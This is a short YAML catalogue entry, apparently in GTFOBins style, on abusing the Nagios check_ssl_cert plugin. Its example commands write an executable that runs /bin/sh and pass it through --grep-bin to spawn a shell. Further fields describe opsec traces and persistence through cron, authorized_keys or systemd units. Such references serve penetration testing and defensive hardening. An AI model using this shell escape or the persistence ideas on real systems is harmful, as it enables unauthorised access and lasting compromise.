---
name: check_ssl_cert
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: This is the `check_ssl_cert` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
    chmod +x /path/to/temp-file
    check_ssl_cert --grep-bin /path/to/temp-file -H x
  notes: The shell will be invoked multiple times.
references:
- https://gtfobins.github.io/gtfobins/check_ssl_cert/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
